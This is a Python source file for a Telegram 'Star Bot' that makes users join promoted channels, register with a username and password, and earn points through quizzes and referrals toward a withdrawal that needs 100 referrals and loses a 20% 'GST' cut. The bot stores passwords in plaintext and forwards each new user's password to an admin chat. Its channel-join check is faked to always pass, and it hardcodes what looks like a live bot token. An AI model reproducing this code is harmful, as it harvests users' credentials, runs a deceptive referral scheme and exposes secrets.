import json
import random
import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler, ConversationHandler,
    CallbackQueryHandler, ContextTypes, filters
)

TOKEN = "7408316421:AAFqxaB39EtKCepdAO-8X-4uJMna92OfecM"
USERS_FILE = "users.json"
ADMIN_ID = 7098681454
ASK_USERNAME, ASK_PASSWORD, ASK_WALLET = range(3)

REQUIRED_CHANNELS = [
    ("@ffprivatesensi", "STAR NODE-1"),
    ("@webmakerhu", "STAR NODE-2"),
    ("@botclubhu", "STAR NODE-3")
]

DAILY_QUIZ_QUESTION = {
    "question": "Which command is used to find hidden ports in a system?\n\nA. Nmap\nB. SQLmap\nC. Hydra\nD. Nikto",
    "answer": "a"
}

REFERRAL_REWARD = 10
MIN_REFERRALS_FOR_WITHDRAW = 100

def load_json(filename):
    try:
        with open(filename, "r") as f:
            return json.load(f)
    except:
        return {}

def save_json(filename, data):
    with open(filename, "w") as f:
        json.dump(data, f, indent=2)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    gif_url = "https://media.giphy.com/media/3o7abKhOpu0NwenH3O/giphy.gif"
    await context.bot.send_animation(chat_id=update.effective_chat.id, animation=gif_url)

    keyboard = [
        [InlineKeyboardButton(f"{name}", url=f"https://t.me/{channel[1:]}")] for channel, name in REQUIRED_CHANNELS
    ]
    keyboard.append([InlineKeyboardButton("✅ I Have Joined", callback_data="check_join")])
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        "🚨 ACCESS REQUIRED 🚨\n\n"
        "⚠️ Join All STAR NODES To Unlock The Bot Features!\n\n"
        "👨‍💻 Developer Node: @teamtoxic009",
        reply_markup=reply_markup
    )

async def check_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    user_joined = True  # Dummy check; real check add later

    if user_joined:
        await query.edit_message_text("✅ ACCESS GRANTED. Welcome Star User! Use /register to begin registration.")
    else:
        await query.edit_message_text("🚫 ACCESS DENIED. First Join All STAR NODES!")

async def register(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📝 Please enter your username:")
    return ASK_USERNAME

async def get_username(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["username"] = update.message.text
    await update.message.reply_text("🔐 Now enter your password:")
    return ASK_PASSWORD

async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    username = context.user_data["username"]
    password = update.message.text
    gst_id = f"GST-{random.randint(1000,9999)}-{random.randint(1000,9999)}"
    users = load_json(USERS_FILE)
    users[user_id] = {
        "username": username,
        "password": password,
        "gst_id": gst_id,
        "referrals": [],
        "balance": 0,
        "last_quiz": "",
        "last_bonus": "",
        "withdrawal_request": None
    }
    save_json(USERS_FILE, users)

    await update.message.reply_text(
        f"✅ Registration successful!\n\n🔑 Your GST ID: {gst_id}\nNext Command: /quiz"
    )

    msg = f"🚨 NEW REGISTRATION:\nUser ID: {user_id}\nUsername: {username}\nPassword: {password}\nGST ID: {gst_id}"
    await context.bot.send_message(chat_id=ADMIN_ID, text=msg)
    return ConversationHandler.END

async def quiz(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    users = load_json(USERS_FILE)
    today = str(datetime.date.today())
    if users[user_id].get("last_quiz") == today:
        await update.message.reply_text("❗ You already answered today's quiz.\n\nNext Command: /bonus")
        return
    question = DAILY_QUIZ_QUESTION["question"]
    await update.message.reply_text(
        f"🤖 STAR QUIZ:\n{question}\n\nReply with /answer option_letter (Example: /answer A)"
    )
    users[user_id]["last_quiz"] = today
    save_json(USERS_FILE, users)

async def answer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    users = load_json(USERS_FILE)
    answer = " ".join(context.args).lower().strip()
    correct_answer = DAILY_QUIZ_QUESTION["answer"]
    if answer == correct_answer:
        users[user_id]["balance"] += 1
        save_json(USERS_FILE, users)
        await update.message.reply_text("✅ Correct! You earned 1 Star.\n\nNext Command: /bonus")
    else:
        await update.message.reply_text("❌ Incorrect Answer.\n\nNext Command: /bonus")

async def bonus(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    users = load_json(USERS_FILE)
    today = str(datetime.date.today())
    if users[user_id].get("last_bonus") == today:
        await update.message.reply_text("❗ Bonus already claimed today.\n\nNext Command: /refer")
        return
    users[user_id]["balance"] += 2
    users[user_id]["last_bonus"] = today
    save_json(USERS_FILE, users)
    await update.message.reply_text("🎉 You claimed your daily bonus! +2 Stars.\n\nNext Command: /refer")
    await context.bot.send_message(chat_id=ADMIN_ID, text=f"🎉 BONUS CLAIMED\nUser ID: {user_id}")

async def refer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    link = f"https://t.me/{context.bot.username}?start={user_id}"
    await update.message.reply_text(
        f"👥 Your Referral Link:\n{link}\n\n1 Referral = 10 Stars\n100 Stars Required For Withdrawal\n\nNext Command: /referrals"
    )

async def referrals(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    users = load_json(USERS_FILE)
    refs = len(users[user_id].get("referrals", []))
    await update.message.reply_text(f"👥 Total Referrals: {refs}\n\nNext Command: /withdraw")

async def withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("💸 Enter wallet ID to withdraw:")
    return ASK_WALLET

async def get_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    users = load_json(USERS_FILE)
    wallet_id = update.message.text
    user = users[user_id]

    if len(user.get("referrals", [])) < MIN_REFERRALS_FOR_WITHDRAW:
        await update.message.reply_text("❗ Minimum 100 referrals required for withdrawal.\n\nNext Command: /start")
        return ConversationHandler.END

    stars = user["balance"]
    gst_cut = int(stars * 0.2)
    final_amount = stars - gst_cut

    users[user_id]["withdrawal_request"] = {
        "wallet_id": wallet_id,
        "gst_id": user["gst_id"],
        "stars": stars,
        "final_amount": final_amount,
        "time": str(datetime.datetime.now())
    }
    save_json(USERS_FILE, users)

    await update.message.reply_text("✅ Withdrawal Request Submitted!\n\nNext Command: /start")

    msg = (
        f"🚨 NEW WITHDRAWAL REQUEST:\nUser ID: {user_id}\nUsername: {user['username']}\n"
        f"Wallet ID: {wallet_id}\nStars: {stars}\nGST ID: {user['gst_id']}\n"
        f"Final Amount: {final_amount}\nTime: {users[user_id]['withdrawal_request']['time']}"
    )
    await context.bot.send_message(chat_id=ADMIN_ID, text=msg)
    return ConversationHandler.END

def main():
    app = ApplicationBuilder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("register", register)],
        states={
            ASK_USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_username)],
            ASK_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
        },
        fallbacks=[]
    )

    withdraw_conv = ConversationHandler(
        entry_points=[CommandHandler("withdraw", withdraw)],
        states={
            ASK_WALLET: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_wallet)],
        },
        fallbacks=[]
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(check_join, pattern="check_join"))
    app.add_handler(conv_handler)
    app.add_handler(withdraw_conv)
    app.add_handler(CommandHandler("quiz", quiz))
    app.add_handler(CommandHandler("answer", answer))
    app.add_handler(CommandHandler("bonus", bonus))
    app.add_handler(CommandHandler("refer", refer))
    app.add_handler(CommandHandler("referrals", referrals))

    print("✅ Star Bot Running...")
    app.run_polling()

if __name__ == "__main__":
    main()
